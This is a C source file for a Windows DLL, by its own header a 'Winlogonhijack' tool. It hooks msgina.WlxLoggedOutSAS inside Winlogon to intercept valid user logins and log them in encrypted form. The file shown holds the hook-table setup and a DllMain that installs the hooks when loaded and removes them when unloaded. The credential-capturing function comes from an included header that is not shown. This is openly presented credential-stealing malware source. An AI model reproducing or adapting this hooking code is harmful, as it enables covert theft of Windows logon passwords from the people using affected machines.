////////////////////////////////////////////////////////////////////
// Winlogonhijack Dll Written by JeFFOsZ, respect it ;)
//
// This dll hooks msgina.WlxLoggedOutSAS in the process where it is
// loaded. It uses the "extended API code overwrite" method.
// 
// version 0.3
// -----------
// + Logging encrypted now
//
// version 0.2
// -----------
// + Added unhooking when dll unloads.
//
// version 0.1
// -----------
// + Using 'extended code overwrite method' for hooking 
//   as descriped in HF's (http://hxdef.czweb.org/) hookingen.txt 
// + Using LDE-32 from z0mbie (http://z0mbie.host.sk)
// + Hooks msgina.WlxLoggedOutSAS for intercepting valid logins.
//
////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "maindll.h"

// Functions for hooking API 
#include "hook.h" // <- good mofo :)

// Replacement Functions includes
#include "wlxloggedoutsas.h" // WlxLoggedOutSAS

// Init htHookTable's hook addresses -> 
// getting the addresses for the replacement functions.
// Edit this if you edited the htHookTable.
//
// ex. htHookTable[i].ppHook=&MyHookFunction;
//     where 'i' is the index of your function in 
//     htHookTable (it starts from 0).

void InitHooks(void)
{
	// New address for "WlxLoggedOutSAS" hook
	htHookTable[WLXLOGGEDOUTHOOK].ppHook=&NewWlxLoggedOutSAS; 
}	

// DllMain...this is where the magic happens ;)
// This procedure will be executed if the dll get loaded.
// All functions in htHookTable get h000k333d ! ;)
BOOL APIENTRY DllMain(HINSTANCE hInst,DWORD dwReason,LPVOID pvReserved)
{
	u_int i;

	// Initialize htHookTable's hook addresses
	InitHooks();
	
	switch (dwReason) 
    {
    case DLL_PROCESS_ATTACH:
		i=0;
		// Hook
		while (htHookTable[i].dll && htHookTable[i].func)
		{
			htHookTable[i].ppOriginal=HookFunctionInCurrentProcess(htHookTable[i].dll,htHookTable[i].func,htHookTable[i].ppHook);
			i++;
		}
	    break;
    case DLL_PROCESS_DETACH:
		i=0;
		// Unhook
		while (htHookTable[i].dll && htHookTable[i].func)
		{
			UnHookFunctionInCurrentProcess(htHookTable[i].dll,htHookTable[i].func,htHookTable[i].ppOriginal);
			i++;
		}
      break;
    case DLL_THREAD_ATTACH:
	  break;
    case DLL_THREAD_DETACH:
	  break;
    }
	
	return 1;
}
